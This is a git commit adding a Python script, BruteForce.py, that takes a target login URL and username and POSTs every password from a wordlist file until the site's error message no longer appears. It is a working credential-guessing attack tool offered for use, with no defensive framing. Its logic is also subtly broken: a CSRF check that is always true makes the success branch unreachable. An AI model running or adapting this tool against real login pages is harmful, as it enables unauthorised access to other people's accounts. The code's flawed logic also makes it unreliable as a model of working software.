5b0312c77c2b9dd5f5fcbe3481780d25c4def36d
xec222 <87489832+xec222@users.noreply.github.com>
2021-07-21 16:29:04 +0300

    Add files via upload

---
+++ BruteForce.py
@@ -0,0 +1,72 @@
+######################################################################################################
+# Title: Brute force                                                                                 #
+# Author:   xec222                                                                        #
+# Github : https://github.com/xec222                                                                  #
+######################################################################################################
+
+print (""" 
+  _____________________                              _____________________
+  `-._:  .:'   `:::  .:\           |\__/|           /::  .:'   `:::  .:.-'
+    \      :          \          |:   |          /         :       /    
+     \     ::    .     `-_______/ ::   \_______-'   .      ::   . /      
+      |  :   :: ::'  :   :: ::'  :   :: ::'      :: ::'  :   :: :|       
+      |     ;::         ;::         ;::         ;::         ;::  |       
+      |  .:'   `:::  .:'   `:::  .:'xec`:::  .:'   `:::  .:'   `:|       
+      /     :           :           :           :           :    \       
+     /______::_____     ::    .     ::    .     ::   _____._::____\      
+                   `----._:: ::'  :   :: ::'  _.----'                    
+                          `--.       ;::  .--'                           
+                              `-. .:'  .-'                               
+                                 \    / https://github.com/xec222                                  
+                                  \  /                                   
+                                   \/ 
+                                                                            
+                                Xec222
+        
+""")
+
+z = """     
+                       Checking the Server !!
+        
+        [+]█████████████████████████████████████████████████[+]
+"""
+
+
+import requests
+import time
+import sys
+
+url = input("Enter Target Url: ")
+username = input("Enter Target Username: ")
+error = input("Enter Wrong Password Error Message: ")
+
+for c in z:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.02)
+
+try: 
+    def bruteCracking(username,url,error):
+        count = 0
+        for password in passwords:
+            password = password.strip()
+            count = count + 1
+            print("Trying Password: "+ str(count) + ' Time For => ' + password)
+            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
+            response = requests.post(url, data=data_dict)
+            if error in str(response.content):
+                pass
+            elif "CSRF" or "csrf" in str(response.content):
+                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+                exit()
+            else:
+                print("Username: ---> " + username)
+                print("Password: ---> " + password)
+                exit()
+except:
+    print("Some Error Occurred Please Check Your Internet Connection !!")
+
+with open("passwords.txt", "r") as passwords:
+    bruteCracking(username,url,error)
+
+print("[!!] password not in list")
